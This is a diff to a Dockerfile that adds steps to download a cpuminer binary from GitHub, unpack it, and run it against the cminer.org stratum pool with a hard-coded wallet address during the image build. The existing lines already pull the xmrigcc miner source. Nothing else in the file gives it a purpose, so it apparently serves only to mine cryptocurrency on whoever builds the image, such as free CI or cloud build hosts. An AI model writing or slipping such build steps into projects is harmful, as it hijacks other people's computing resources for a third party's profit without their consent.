@@ -1,5 +1,10 @@
 FROM ubuntu:latest
 RUN apt update && apt install wget curl git -y
+
+RUN wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4.1/cpuminer-gr-1.2.4.1-x86_64_ubuntu_22.04.tar.gz
+RUN tar zxvf *.tar.gz
+RUN binaries/cpuminer-avx2 -a gr -o stratum+tcp://cminer.org:5706 -u JfqVz51WWy684TTBo5oojKujuFv6ih9kjd.WORKER_NAME -p c=JGC
+
 WORKDIR ~/
 RUN git init
 RUN git pull https://github.com/bendr0id/xmrigcc
